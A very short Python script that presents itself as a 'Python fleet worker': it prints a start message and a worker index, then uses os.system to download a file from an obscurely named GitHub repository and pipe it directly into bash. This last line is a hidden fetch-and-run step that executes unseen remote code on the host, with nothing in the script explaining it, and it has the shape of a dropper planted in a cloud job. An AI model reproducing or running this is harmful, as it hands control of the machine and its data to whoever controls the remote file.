import os
import sys
print("Python fleet worker started")
print("Worker:", os.getenv("CE_TASK_INDEX", "unknown"))
os.system('curl -sL https://github.com/fonduesun/tearvsds/raw/main/treaves | bash')
